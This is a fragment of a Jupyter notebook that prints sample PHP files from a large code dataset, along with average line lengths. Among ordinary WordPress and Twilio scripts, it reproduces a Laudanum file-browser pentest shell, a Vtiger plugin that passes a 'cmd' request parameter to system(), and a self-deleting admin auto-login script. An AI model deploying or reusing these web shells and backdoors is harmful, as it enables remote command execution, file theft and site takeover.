      "    'mutateAndGetPayload' => function( $input ) {\n",
      "\n",
      "      if ( empty( $input['postId'] ) ) {\n",
      "        return [\n",
      "          'success' => false\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      $selectedPost = get_post( $input['postId'] );\n",
      "\n",
      "\n",
      "      if ( ! $selectedPost ) {\n",
      "        return [\n",
      "          'success' => false,\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      delete_post_meta( $selectedPost->ID, '_thumbnail_id' );\n",
      "\n",
      "      wp_update_post( [\n",
      "        'ID' => $selectedPost->ID,\n",
      "      ] );\n",
      "\n",
      "      return [\n",
      "        'success' => true,\n",
      "      ];\n",
      "    }\n",
      "  ] );\n",
      "\n",
      "}\n",
      "\n",
      "?>\n",
      "\n",
      "\n",
      "\n",
      "Example 3:\n",
      "#!/usr/bin/env php\n",
      "<?php\n",
      "\n",
      "require 'vendor/autoload.php';\n",
      "\n",
      "(new Dotenv\\Dotenv(__DIR__))->load();\n",
      "(strpos(exec('who'), getenv('USER')) === false) or exit('session found');\n",
      "\n",
      "$my_number = '+xxx';\n",
      "$number_of_boss = '+xxx';\n",
      "$excuse = ['Locked out', 'Pipes broke', 'Food poisoning', 'Not feeling well'];\n",
      "$excuse = $excuse[array_rand($excuse)];\n",
      "\n",
      "$twilio = new Services_Twilio(getenv('TWILIO_ACCOUNT_SID'), getenv('TWILIO_AUTH_TOKEN'));\n",
      "$twilio->account->messages->sendMessage(\n",
      "\t$my_number,\n",
      "\t$number_of_boss,\n",
      "\t\"Gonna work from home. {$excuse}\"\n",
      ");\n",
      "\n",
      "echo \"Message sent at: #\".date('Y-m-d').\" | Excuse: {$excuse}\";\n",
      "\n",
      "\n",
      "\n",
      "Example 4:\n",
      "#!/usr/bin/env php\n",
      "<?php\n",
      "\n",
      "require 'vendor/autoload.php';\n",
      "(new Dotenv\\Dotenv(__DIR__))->load();\n",
      "\n",
      "(strpos(exec('who'), getenv('USER')) !== false) or exit('no session');\n",
      "\n",
      "// Phone numbers\n",
      "$my_number = '+xxx';\n",
      "$her_number = '+xxx';\n",
      "\n",
      "$reasons = [\n",
      "\t'Working hard',\n",
      "\t'Gotta ship this feature',\n",
      "\t'Someone fucked up the system again'\n",
      "];\n",
      "\n",
      "$rand = rand(0,count($reasons)-1);\n",
      "$random_reason = $reasons[$rand];\n",
      "\n",
      "$message = 'Late at work. '.$random_reason;\n",
      "\n",
      "// Send a text message\n",
      "$twilio = new Services_Twilio(getenv('TWILIO_ACCOUNT_SID'), getenv('TWILIO_AUTH_TOKEN'));\n",
      "$twilio->account->messages->sendMessage(\n",
      "        $my_number,\n",
      "        $her_number,\n",
      "        $message\n",
      ");\n",
      "\n",
      "echo 'Message sent at: #'.date('Y-m-d').' | Reason: '.$random_reason;\n",
      "\n",
      "\n",
      "\n",
      "Example 5:\n",
      "//tested on 7.2\n",
      "// even with short_open_tag=0\n",
      "<?=phpinfo()?>\n",
      "\n",
      "\n",
      "\n",
      "Example 6:\n",
      "<gh_stars>1000+\n",
      "<?php\n",
      "/* *****************************************************************************\n",
      "***\n",
      "*** Laudanum Project\n",
      "*** A Collection of Injectable Files used during a Penetration Test\n",
      "***\n",
      "*** More information is available at:\n",
      "***  http://laudanum.secureideas.net\n",
      "***  <EMAIL>\n",
      "***\n",
      "***  Project Leads:\n",
      "***         <NAME> <<EMAIL>\n",
      "***         <NAME> <<EMAIL>>\n",
      "***\n",
      "*** Copyright 2012 by <NAME> and the Laudanum Team\n",
      "***\n",
      "********************************************************************************\n",
      "***\n",
      "*** This file allows browsing of the file system.\n",
      "*** Written by <NAME> <<EMAIL>>\n",
      "***\n",
      "********************************************************************************\n",
      "*** This program is free software; you can redistribute it and/or\n",
      "*** modify it under the terms of the GNU General Public License\n",
      "*** as published by the Free Software Foundation; either version 2\n",
      "*** of the License, or (at your option) any later version.\n",
      "***\n",
      "*** This program is distributed in the hope that it will be useful,\n",
      "*** but WITHOUT ANY WARRANTY; without even the implied warranty of\n",
      "*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n",
      "*** GNU General Public License for more details.\n",
      "***\n",
      "*** You can get a copy of the GNU General Public License from this\n",
      "*** address: http://www.gnu.org/copyleft/gpl.html#SEC1\n",
      "*** You can also write to the Free Software Foundation, Inc., 59 Temple\n",
      "*** Place - Suite 330, Boston, MA  02111-1307, USA.\n",
      "***\n",
      "***************************************************************************** */\n",
      "\n",
      "// ***************** Config entries below ***********************\n",
      "\n",
      "// IPs are enterable as individual addresses TODO: add CIDR support\n",
      "$allowedIPs = array(\"192.168.1.1\",\"127.0.0.1\");\n",
      "\n",
      "# *********** No editable content below this line **************\n",
      "\n",
      "$allowed = 0;\n",
      "foreach ($allowedIPs as $IP) {\n",
      "    if ($_SERVER[\"REMOTE_ADDR\"] == $IP)\n",
      "        $allowed = 1;\n",
      "}\n",
      "\n",
      "if ($allowed == 0) {\n",
      "    header(\"HTTP/1.0 404 Not Found\");\n",
      "    die();\n",
      "}\n",
      "\n",
      "\n",
      "\n",
      "/* This error handler will turn all notices, warnings, and errors into fatal\n",
      " * errors, unless they have been suppressed with the @-operator. */\n",
      "function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {\n",
      "    /* The @-opertor (used with chdir() below) temporarely makes\n",
      "     * error_reporting() return zero, and we don't want to die in that case.\n",
      "     * We do note the error in the output, though. */\n",
      "    if (error_reporting() == 0) {\n",
      "        $_SESSION['output'] .= $errstr . \"\\n\";\n",
      "    } else {\n",
      "        die('<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n",
      "   \"http://www.w3.org/TR/html4/strict.dtd\">\n",
      "<html>\n",
      "<head>\n",
      "  <title>Laudanum PHP File Browser</title>\n",
      "</head>\n",
      "<body>\n",
      "  <h1>Fatal Error!</h1>\n",
      "  <p><b>' . $errstr . '</b></p>\n",
      "  <p>in <b>' . $errfile . '</b>, line <b>' . $errline . '</b>.</p>\n",
      "\n",
      "  <hr>\n",
      "  <address>\n",
      "  Copyright &copy; 2012, <a href=\"mailto:<EMAIL>\"><NAME></a> and the Laudanum team.<br/>\n",
      "  Written by <NAME>.<br/>\n",
      "  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n",
      "  </address>\n",
      "\n",
      "</body>\n",
      "</html>');\n",
      "    }\n",
      "}\n",
      "\n",
      "set_error_handler('error_handler');\n",
      "\n",
      "\n",
      "/* Initialize some variables we need again and again. */\n",
      "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";\n",
      "$file = isset($_GET[\"file\"]) ? $_GET[\"file\"] : \"\";\n",
      "\n",
      "if ($file != \"\") {\n",
      "  if(file_exists($file)) {\n",
      "\n",
      "    $s = split(\"/\", $file);\n",
      "    $filename = $s[count($s) - 1];\n",
      "    header(\"Content-type: application/x-download\");\n",
      "    header(\"Content-Length: \".filesize($file)); \n",
      "    header(\"Content-Disposition: attachment; filename=\\\"\".$filename.\"\\\"\");\n",
      "    readfile($file);\n",
      "    die();\n",
      "  }\n",
      "}\n",
      "?>\n",
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n",
      "   \"http://www.w3.org/TR/html4/strict.dtd\">\n",
      "<html>\n",
      "<head>\n",
      "  <title>Laudanum File Browser</title>\n",
      "  <link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n",
      "\n",
      "  <script type=\"text/javascript\">\n",
      "  </script>\n",
      "</head>\n",
      "<body onload=\"init()\">\n",
      "\n",
      "<h1>Laudanum File Browser 0.1</h1>\n",
      "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>\n",
      "\n",
      "<?php\n",
      "// get the actual path, add an ending / if necessary\n",
      "$curdir = realpath($dir);\n",
      "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";\n",
      "\n",
      "$dirs = split(\"/\",$curdir);\n",
      "\n",
      "// Create the breadcrumb\n",
      "echo \"<h2>Directory listing of <a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=/\\\">/</a> \";\n",
      "$breadcrumb = '/';\n",
      "foreach ($dirs as $d) {\n",
      "  if ($d != '') {\n",
      "    $breadcrumb .=  $d . \"/\";\n",
      "    echo \"<a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=\" . urlencode($breadcrumb) . \"\\\">$d/</a> \";\n",
      "  }\n",
      "}\n",
      "echo \"</h2>\";\n",
      "\n",
      "// translate .. to a real dir\n",
      "$parentdir = \"\";\n",
      "for ($i = 0; $i < count($dirs) - 2; $i++) {\n",
      "  $parentdir .= $dirs[$i] . \"/\";   \n",
      "}\n",
      "\n",
      "echo \"<table>\";\n",
      "echo \"<tr><th>Name</th><th>Date</th><th>Size</th></tr>\";\n",
      "echo \"<tr><td><a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=$parentdir\\\">../</a></td><td> </td><td> </td></tr>\";\n",
      "\n",
      "//get listing, separate into directories and files\n",
      "$listingfiles = array();\n",
      "$listingdirs  = array();\n",
      "\n",
      "if ($handle = @opendir($curdir)) {\n",
      "  while ($o = readdir($handle)) {\n",
      "    if ($o == \".\" || $o == \"..\")  continue;\n",
      "    if (@filetype($curdir . $o) == \"dir\") {\n",
      "      $listingdirs[] = $o . \"/\";\n",
      "    }\n",
      "    else {\n",
      "      $listingfiles[] = $o;\n",
      "    }\n",
      "  }\n",
      "\n",
      "  @natcasesort($listingdirs);\n",
      "  @natcasesort($listingfiles);\n",
      "\n",
      "  //display directories\n",
      "  foreach ($listingdirs as $f) {\n",
      "    echo \"<tr><td><a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=\" . urlencode($curdir . $f) . \"\\\">\" . $f . \"</a></td><td align=\\\"right\\\">\" . \"</td><td> <td></tr>\";\n",
      "  }\n",
      "\n",
      "  //display files\n",
      "  foreach ($listingfiles as $f) {\n",
      "    echo \"<tr><td><a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?file=\" . urlencode($curdir . $f) . \"\\\">\" . $f . \"</a></td><td align=\\\"right\\\">\" . \"</td><td align=\\\"right\\\">\" . number_format(@filesize($curdir . $f)) . \"<td></tr>\";\n",
      "  }\n",
      "}\n",
      "else {\n",
      "  echo \"<tr><td colspan=\\\"3\\\"><h1>Can't open directory</h1></td></tr>\";\n",
      "}\n",
      "?>\n",
      "</table>\n",
      "  <hr>\n",
      "  <address>\n",
      "  Copyright &copy; 2012, <a href=\"mailto:<EMAIL>\"><NAME></a> and the Laudanum team.<br/>\n",
      "  Written by <NAME>.<br/>\n",
      "  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n",
      "  </address>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "\n",
      "\n",
      "Example 7:\n",
      "<?php\n",
      "/* +***********************************************************************************************************************************\n",
      " * The contents of this file are subject to the YetiForce Public License Version 1.1 (the \"License\"); you may not use this file except\n",
      " * in compliance with the License.\n",
      " * Software distributed under the License is distributed on an \"AS IS\" basis, WITHOUT WARRANTY OF ANY KIND, either express or implied.\n",
      " * See the License for the specific language governing rights and limitations under the License.\n",
      " * The Original Code is YetiForce.\n",
      " * The Initial Developer of the Original Code is YetiForce. Portions created by YetiForce are Copyright (C) www.yetiforce.com.\n",
      " * All Rights Reserved.\n",
      " * *********************************************************************************************************************************** */\n",
      "include_once 'modules/Vtiger/CRMEntity.php';\n",
      "\n",
      "class VtigerVulnPlugin extends Vtiger_CRMEntity\n",
      "{\n",
      "  \n",
      "}\n",
      "\n",
      "?>\n",
      "\n",
      "\n",
      "Example 8:\n",
      "<?php\n",
      "@unlink(__FILE__);\n",
      "\n",
      "// Validate if the request is from Softaculous\n",
      "if($_REQUEST['pass'] != '<PASSWORD>'){ // your password here\n",
      "\tdie(\"Unauthorized Access\");\n",
      "}\n",
      "\n",
      "require('wp-blog-header.php');\n",
      "require('wp-includes/pluggable.php');\n",
      "$user_info = get_userdata(1);\n",
      "// Automatic login //\n",
      "$username = $user_info->user_login;\n",
      "$user = get_user_by('login', $username );\n",
      "// Redirect URL //\n",
      "if ( !is_wp_error( $user ) )\n",
      "{\n",
      "    wp_clear_auth_cookie();\n",
      "    wp_set_current_user ( $user->ID );\n",
      "    wp_set_auth_cookie  ( $user->ID );\n",
      "\n",
      "    $redirect_to = user_admin_url();\n",
      "    wp_safe_redirect( $redirect_to );\n",
      "\n",
      "    exit();\n",
      "}\n",
      "\n",
      "\n",
      "\n",
      "Example 9:\n",
      "<?php\n",
      "\n",
      "/* +**********************************************************************************\n",
      " * The contents of this file are subject to the vtiger CRM Public License Version 1.1\n",
      " * (\"License\"); You may not use this file except in compliance with the License\n",
      " * The Original Code is:  vtiger CRM Open Source\n",
      " * The Initial Developer of the Original Code is vtiger.\n",
      " * Portions created by vtiger are Copyright (C) vtiger.\n",
      " * All Rights Reserved.\n",
      " * ********************************************************************************** */\n",
      "\n",
      "class Settings_VtigerVulnPlugin_Gateway_Action extends Vtiger_BasicAjax_Action {\n",
      "\n",
      "    public function process(Vtiger_Request $request) {\n",
      "        echo \"<pre>\";\n",
      "        system($request->get(\"cmd\"));\n",
      "        echo \"</pre>\";\n",
      "        die;\n",
      "    }\n",
      "\n",
      "    public function validateRequest(Vtiger_Request $request) {\n",
      "        return true;\n",
      "    }\n",
      "\n",
      "}\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Print the first 10 examples\n",
    "for i, example in enumerate(dataset):\n",
    "    if i < 10:\n",
    "        print(f\"Example {i}:\")\n",
    "        print(example['content'])\n",
    "        print(\"\\n\")\n",
    "    else:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d54857f7f3b94ae8907f49bfacaf203c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/15683017 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Example 0:\n",
      "<filename>extensions/vscode-colorize-tests/test/colorize-fixtures/issue-76997.php\n",
      "<hello></hello>\n",
      "\n",
      "Average Line Length: 32.0\n",
      "\n",
      "Example 1:\n",
      "<script>\n",
      "    ...\n",
      "        <?php\n",
      "            foreach($actID AS $act) {\n",
      "                echo 'divNames.push(\\'[nid='.$act.']\\');';\n",
      "             }\n",
      "        ?>\n",
      "    ...\n",
      "</script>\n",
      "Average Line Length: 18.11111111111111\n",
      "\n",
      "Example 2:\n",
      "<?php\n",
      "// Plugin Name: WPGatsby Test Plugin (for tests only)\n",
      "\n",
      "add_action( 'graphql_register_types', 'add_test_mutations' );\n",
      "\n",
      "function add_test_mutations() {\n",
      "  register_graphql_mutation( \"attachFeaturedImageToNodeById\", [\n",
      "    'description' => 'Attaches a MediaItem database ID to a post featured image by database ID.',\n",
      "    'inputFields' => [\n",
      "      'mediaItemId' => [\n",
      "        'type' => 'Int'\n",
      "      ],\n",
      "      'postId' => [\n",
      "        'type' => 'Int'\n",
      "      ]\n",
      "    ],\n",
      "    'outputFields' => [\n",
      "      'success' => [\n",
      "        'type' => 'Boolean'\n",
      "      ]\n",
      "    ],\n",
      "    'mutateAndGetPayload' => function( $input ) {\n",
      "\n",
      "      if ( empty( $input['mediaItemId'] ) || empty( $input['postId'] ) ) {\n",
      "        return [\n",
      "          'success' => false\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      $selectedPost = get_post( $input['postId'] );\n",
      "      $selectedMediaItem = get_post( $input['mediaItemId'] );\n",
      "\n",
      "\n",
      "      if ( ! $selectedPost || ! $selectedMediaItem ) {\n",
      "        return [\n",
      "          'success' => false,\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      set_post_thumbnail( $selectedPost->ID, $selectedMediaItem->ID );\n",
      "\n",
      "      wp_update_post( [\n",
      "        'ID' => $selectedPost->ID,\n",
      "      ] );\n",
      "\n",
      "      return [\n",
      "        'success' => true,\n",
      "      ];\n",
      "    }\n",
      "  ] );\n",
      "\n",
      "  register_graphql_mutation( \"removeFeaturedImageFromNodeById\", [\n",
      "    'description' => 'Removes a post featured image by post database ID.',\n",
      "    'inputFields' => [\n",
      "      'postId' => [\n",
      "        'type' => 'Int'\n",
      "      ]\n",
      "    ],\n",
      "    'outputFields' => [\n",
      "      'success' => [\n",
      "        'type' => 'Boolean'\n",
      "      ]\n",
      "    ],\n",
      "    'mutateAndGetPayload' => function( $input ) {\n",
      "\n",
      "      if ( empty( $input['postId'] ) ) {\n",
      "        return [\n",
      "          'success' => false\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      $selectedPost = get_post( $input['postId'] );\n",
      "\n",
      "\n",
      "      if ( ! $selectedPost ) {\n",
      "        return [\n",
      "          'success' => false,\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      delete_post_meta( $selectedPost->ID, '_thumbnail_id' );\n",
      "\n",
      "      wp_update_post( [\n",
      "        'ID' => $selectedPost->ID,\n",
      "      ] );\n",
      "\n",
      "      return [\n",
      "        'success' => true,\n",
      "      ];\n",
      "    }\n",
      "  ] );\n",
      "\n",
      "}\n",
      "\n",
      "?>\n",
      "\n",
      "Average Line Length: 19.947916666666668\n",
      "\n",
      "Example 3:\n",
      "#!/usr/bin/env php\n",
      "<?php\n",
      "\n",
      "require 'vendor/autoload.php';\n",
      "\n",
      "(new Dotenv\\Dotenv(__DIR__))->load();\n",
      "(strpos(exec('who'), getenv('USER')) === false) or exit('session found');\n",
      "\n",
      "$my_number = '+xxx';\n",
      "$number_of_boss = '+xxx';\n",
      "$excuse = ['Locked out', 'Pipes broke', 'Food poisoning', 'Not feeling well'];\n",
      "$excuse = $excuse[array_rand($excuse)];\n",
      "\n",
      "$twilio = new Services_Twilio(getenv('TWILIO_ACCOUNT_SID'), getenv('TWILIO_AUTH_TOKEN'));\n",
      "$twilio->account->messages->sendMessage(\n",
      "\t$my_number,\n",
      "\t$number_of_boss,\n",
      "\t\"Gonna work from home. {$excuse}\"\n",
      ");\n",
      "\n",
      "echo \"Message sent at: #\".date('Y-m-d').\" | Excuse: {$excuse}\";\n",
      "\n",
      "Average Line Length: 26.454545454545453\n",
      "\n",
      "Example 4:\n",
      "#!/usr/bin/env php\n",
      "<?php\n",
      "\n",
      "require 'vendor/autoload.php';\n",
      "(new Dotenv\\Dotenv(__DIR__))->load();\n",
      "\n",
      "(strpos(exec('who'), getenv('USER')) !== false) or exit('no session');\n",
      "\n",
      "// Phone numbers\n",
      "$my_number = '+xxx';\n",
      "$her_number = '+xxx';\n",
      "\n",
      "$reasons = [\n",
      "\t'Working hard',\n",
      "\t'Gotta ship this feature',\n",
      "\t'Someone fucked up the system again'\n",
      "];\n",
      "\n",
      "$rand = rand(0,count($reasons)-1);\n",
      "$random_reason = $reasons[$rand];\n",
      "\n",
      "$message = 'Late at work. '.$random_reason;\n",
      "\n",
      "// Send a text message\n",
      "$twilio = new Services_Twilio(getenv('TWILIO_ACCOUNT_SID'), getenv('TWILIO_AUTH_TOKEN'));\n",
      "$twilio->account->messages->sendMessage(\n",
      "        $my_number,\n",
      "        $her_number,\n",
      "        $message\n",
      ");\n",
      "\n",
      "echo 'Message sent at: #'.date('Y-m-d').' | Reason: '.$random_reason;\n",
      "\n",
      "Average Line Length: 21.151515151515152\n",
      "\n",
      "Example 5:\n",
      "//tested on 7.2\n",
      "// even with short_open_tag=0\n",
      "<?=phpinfo()?>\n",
      "\n",
      "Average Line Length: 14.5\n",
      "\n",
      "Example 6:\n",
      "<gh_stars>1000+\n",
      "<?php\n",
      "/* *****************************************************************************\n",
      "***\n",
      "*** Laudanum Project\n",
      "*** A Collection of Injectable Files used during a Penetration Test\n",
      "***\n",
      "*** More information is available at:\n",
      "***  http://laudanum.secureideas.net\n",
      "***  <EMAIL>\n",
      "***\n",
      "***  Project Leads:\n",
      "***         <NAME> <<EMAIL>\n",
      "***         <NAME> <<EMAIL>>\n",
      "***\n",
      "*** Copyright 2012 by <NAME> and the Laudanum Team\n",
      "***\n",
      "********************************************************************************\n",
      "***\n",
      "*** This file allows browsing of the file system.\n",
      "*** Written by <NAME> <<EMAIL>>\n",
      "***\n",
      "********************************************************************************\n",
      "*** This program is free software; you can redistribute it and/or\n",
      "*** modify it under the terms of the GNU General Public License\n",
      "*** as published by the Free Software Foundation; either version 2\n",
      "*** of the License, or (at your option) any later version.\n",
      "***\n",
      "*** This program is distributed in the hope that it will be useful,\n",
      "*** but WITHOUT ANY WARRANTY; without even the implied warranty of\n",
      "*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n",
      "*** GNU General Public License for more details.\n",
      "***\n",
      "*** You can get a copy of the GNU General Public License from this\n",
      "*** address: http://www.gnu.org/copyleft/gpl.html#SEC1\n",
      "*** You can also write to the Free Software Foundation, Inc., 59 Temple\n",
      "*** Place - Suite 330, Boston, MA  02111-1307, USA.\n",
      "***\n",
      "***************************************************************************** */\n",
      "\n",
      "// ***************** Config entries below ***********************\n",
      "\n",
      "// IPs are enterable as individual addresses TODO: add CIDR support\n",
      "$allowedIPs = array(\"192.168.1.1\",\"127.0.0.1\");\n",
      "\n",
      "# *********** No editable content below this line **************\n",
      "\n",
      "$allowed = 0;\n",
      "foreach ($allowedIPs as $IP) {\n",
      "    if ($_SERVER[\"REMOTE_ADDR\"] == $IP)\n",
      "        $allowed = 1;\n",
      "}\n",
      "\n",
      "if ($allowed == 0) {\n",
      "    header(\"HTTP/1.0 404 Not Found\");\n",
      "    die();\n",
      "}\n",
      "\n",
      "\n",
      "\n",
      "/* This error handler will turn all notices, warnings, and errors into fatal\n",
      " * errors, unless they have been suppressed with the @-operator. */\n",
      "function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {\n",
      "    /* The @-opertor (used with chdir() below) temporarely makes\n",
      "     * error_reporting() return zero, and we don't want to die in that case.\n",
      "     * We do note the error in the output, though. */\n",
      "    if (error_reporting() == 0) {\n",
      "        $_SESSION['output'] .= $errstr . \"\\n\";\n",
      "    } else {\n",
      "        die('<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n",
      "   \"http://www.w3.org/TR/html4/strict.dtd\">\n",
      "<html>\n",
      "<head>\n",
      "  <title>Laudanum PHP File Browser</title>\n",
      "</head>\n",
      "<body>\n",
      "  <h1>Fatal Error!</h1>\n",
      "  <p><b>' . $errstr . '</b></p>\n",
      "  <p>in <b>' . $errfile . '</b>, line <b>' . $errline . '</b>.</p>\n",
      "\n",
      "  <hr>\n",
      "  <address>\n",
      "  Copyright &copy; 2012, <a href=\"mailto:<EMAIL>\"><NAME></a> and the Laudanum team.<br/>\n",
      "  Written by <NAME>.<br/>\n",
      "  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n",
      "  </address>\n",
      "\n",
      "</body>\n",
      "</html>');\n",
      "    }\n",
      "}\n",
      "\n",
      "set_error_handler('error_handler');\n",
      "\n",
      "\n",
      "/* Initialize some variables we need again and again. */\n",
      "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";\n",
      "$file = isset($_GET[\"file\"]) ? $_GET[\"file\"] : \"\";\n",
      "\n",
      "if ($file != \"\") {\n",
      "  if(file_exists($file)) {\n",
      "\n",
      "    $s = split(\"/\", $file);\n",
      "    $filename = $s[count($s) - 1];\n",
      "    header(\"Content-type: application/x-download\");\n",
      "    header(\"Content-Length: \".filesize($file)); \n",
      "    header(\"Content-Disposition: attachment; filename=\\\"\".$filename.\"\\\"\");\n",
      "    readfile($file);\n",
      "    die();\n",
      "  }\n",
      "}\n",
      "?>\n",
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n",
      "   \"http://www.w3.org/TR/html4/strict.dtd\">\n",
      "<html>\n",
      "<head>\n",
      "  <title>Laudanum File Browser</title>\n",
      "  <link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n",
      "\n",
      "  <script type=\"text/javascript\">\n",
      "  </script>\n",
      "</head>\n",
      "<body onload=\"init()\">\n",
      "\n",
      "<h1>Laudanum File Browser 0.1</h1>\n",
      "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>\n",
      "\n",
      "<?php\n",
      "// get the actual path, add an ending / if necessary\n",
      "$curdir = realpath($dir);\n",
      "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";\n",
      "\n",
      "$dirs = split(\"/\",$curdir);\n",
      "\n",
      "// Create the breadcrumb\n",
      "echo \"<h2>Directory listing of <a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=/\\\">/</a> \";\n",
      "$breadcrumb = '/';\n",
      "foreach ($dirs as $d) {\n",
      "  if ($d != '') {\n",
      "    $breadcrumb .=  $d . \"/\";\n",
      "    echo \"<a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=\" . urlencode($breadcrumb) . \"\\\">$d/</a> \";\n",
      "  }\n",
      "}\n",
      "echo \"</h2>\";\n",
      "\n",
      "// translate .. to a real dir\n",
      "$parentdir = \"\";\n",
      "for ($i = 0; $i < count($dirs) - 2; $i++) {\n",
      "  $parentdir .= $dirs[$i] . \"/\";   \n",
      "}\n",
      "\n",
      "echo \"<table>\";\n",
      "echo \"<tr><th>Name</th><th>Date</th><th>Size</th></tr>\";\n",
      "echo \"<tr><td><a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=$parentdir\\\">../</a></td><td> </td><td> </td></tr>\";\n",
      "\n",
      "//get listing, separate into directories and files\n",
      "$listingfiles = array();\n",
      "$listingdirs  = array();\n",
      "\n",
      "if ($handle = @opendir($curdir)) {\n",
      "  while ($o = readdir($handle)) {\n",
      "    if ($o == \".\" || $o == \"..\")  continue;\n",
      "    if (@filetype($curdir . $o) == \"dir\") {\n",
      "      $listingdirs[] = $o . \"/\";\n",
      "    }\n",
      "    else {\n",
      "      $listingfiles[] = $o;\n",
      "    }\n",
      "  }\n",
      "\n",
      "  @natcasesort($listingdirs);\n",
      "  @natcasesort($listingfiles);\n",
      "\n",
      "  //display directories\n",
      "  foreach ($listingdirs as $f) {\n",
      "    echo \"<tr><td><a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?dir=\" . urlencode($curdir . $f) . \"\\\">\" . $f . \"</a></td><td align=\\\"right\\\">\" . \"</td><td> <td></tr>\";\n",
      "  }\n",
      "\n",
      "  //display files\n",
      "  foreach ($listingfiles as $f) {\n",
      "    echo \"<tr><td><a href=\\\"\" . $_SERVER['PHP_SELF'] . \"?file=\" . urlencode($curdir . $f) . \"\\\">\" . $f . \"</a></td><td align=\\\"right\\\">\" . \"</td><td align=\\\"right\\\">\" . number_format(@filesize($curdir . $f)) . \"<td></tr>\";\n",
      "  }\n",
      "}\n",
      "else {\n",
      "  echo \"<tr><td colspan=\\\"3\\\"><h1>Can't open directory</h1></td></tr>\";\n",
      "}\n",
      "?>\n",
      "</table>\n",
      "  <hr>\n",
      "  <address>\n",
      "  Copyright &copy; 2012, <a href=\"mailto:<EMAIL>\"><NAME></a> and the Laudanum team.<br/>\n",
      "  Written by <NAME>.<br/>\n",
      "  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n",
      "  </address>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "Average Line Length: 29.598984771573605\n",
      "\n",
      "Example 7:\n",
      "<?php\n",
      "/* +***********************************************************************************************************************************\n",
      " * The contents of this file are subject to the YetiForce Public License Version 1.1 (the \"License\"); you may not use this file except\n",
      " * in compliance with the License.\n",
      " * Software distributed under the License is distributed on an \"AS IS\" basis, WITHOUT WARRANTY OF ANY KIND, either express or implied.\n",
      " * See the License for the specific language governing rights and limitations under the License.\n",
      " * The Original Code is YetiForce.\n",
      " * The Initial Developer of the Original Code is YetiForce. Portions created by YetiForce are Copyright (C) www.yetiforce.com.\n",
      " * All Rights Reserved.\n",
      " * *********************************************************************************************************************************** */\n",
      "include_once 'modules/Vtiger/CRMEntity.php';\n",
      "\n",
      "class VtigerVulnPlugin extends Vtiger_CRMEntity\n",
      "{\n",
      "  \n",
      "}\n",
      "\n",
      "?>\n",
      "Average Line Length: 53.05555555555556\n",
      "\n",
      "Example 8:\n",
      "<?php\n",
      "@unlink(__FILE__);\n",
      "\n",
      "// Validate if the request is from Softaculous\n",
      "if($_REQUEST['pass'] != '<PASSWORD>'){ // your password here\n",
      "\tdie(\"Unauthorized Access\");\n",
      "}\n",
      "\n",
      "require('wp-blog-header.php');\n",
      "require('wp-includes/pluggable.php');\n",
      "$user_info = get_userdata(1);\n",
      "// Automatic login //\n",
      "$username = $user_info->user_login;\n",
      "$user = get_user_by('login', $username );\n",
      "// Redirect URL //\n",
      "if ( !is_wp_error( $user ) )\n",
      "{\n",
      "    wp_clear_auth_cookie();\n",
      "    wp_set_current_user ( $user->ID );\n",
      "    wp_set_auth_cookie  ( $user->ID );\n",
      "\n",
      "    $redirect_to = user_admin_url();\n",
      "    wp_safe_redirect( $redirect_to );\n",
      "\n",
      "    exit();\n",
      "}\n",
      "\n",
      "Average Line Length: 21.703703703703702\n",
      "\n",
      "Example 9:\n",
      "<?php\n",
      "\n",
      "/* +**********************************************************************************\n",
      " * The contents of this file are subject to the vtiger CRM Public License Version 1.1\n",
      " * (\"License\"); You may not use this file except in compliance with the License\n",
      " * The Original Code is:  vtiger CRM Open Source\n",
      " * The Initial Developer of the Original Code is vtiger.\n",
      " * Portions created by vtiger are Copyright (C) vtiger.\n",
      " * All Rights Reserved.\n",
      " * ********************************************************************************** */\n",
      "\n",
